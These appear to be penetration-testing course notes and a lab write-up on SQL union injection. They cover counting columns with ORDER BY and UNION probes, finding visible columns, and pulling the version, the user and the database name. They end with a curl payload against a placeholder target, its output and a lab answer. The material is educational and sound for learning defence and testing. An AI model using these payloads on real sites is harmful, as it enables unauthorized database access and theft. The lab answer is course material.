# Section 12 — Union Injection

---

## Step 1 — Detect Number of Columns

### Method A: ORDER BY (recommended)

Increment the column number until you get an error. The last successful number = column count.

```
' order by 1-- -   → success
' order by 2-- -   → success
' order by 3-- -   → success
' order by 4-- -   → success
' order by 5-- -   → ERROR: Unknown column '5' in 'order clause'
```

→ **4 columns**

### Method B: UNION probe

Start low and increment until no error:

```
cn' UNION select 1,2,3-- -     → ERROR: different number of columns
cn' UNION select 1,2,3,4-- -   → success
```

→ **4 columns**

> ORDER BY is quieter (no error until you overshoot) and doesn't need to match data types.

---

## Step 2 — Find Visible Columns

Not all columns render on the page. Use numbers as placeholders — whichever numbers appear in the output are the injectable positions.

```sql
cn' UNION select 1,2,3,4-- -
```

If the response shows `2, 3, 4` but not `1` → column 1 is hidden. Use columns 2, 3, or 4 for your payload.

---

## Step 3 — Extract Data

Replace the number in a visible column with your target expression:

```sql
-- Get DB version
cn' UNION select 1,@@version,3,4-- -

-- Get current DB user
cn' UNION select 1,user(),3,4-- -

-- Get current database name
cn' UNION select 1,database(),3,4-- -
```

---

## Lab — Get the Result of `user()`

**Target:** `http://TARGET_IP:TARGET_PORT/search.php?port_code=`  
**Objective:** Use UNION injection to return the output of `user()`.

**Reasoning:**
- `ORDER BY 4` succeeds, `ORDER BY 5` fails → 4 columns
- `UNION select 1,2,3,4` shows `2, 3, 4` in the output → column 1 is hidden, columns 2-4 are visible
- Place `user()` in column 2 (first visible position)

```bash
curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+select+1,user(),3,4--+-"
```

**Result:**
```
Port Code     | Port City | Port Volume
root@localhost | 3         | 4
```

**Q1 Answer:** `root@localhost`

---

## Exam Notes

- Always determine column count before attempting UNION — a mismatch returns an error and no data
- Use numbers as junk data to visually identify which column positions render in the response
- `user()`, `database()`, `@@version` are fast recon queries — run all three once you have a working UNION
- `root@localhost` means the web app is running as the MySQL root user — high-impact: file read/write and full schema access are likely possible
- Column 1 often maps to an ID field that isn't displayed — start probing from column 2
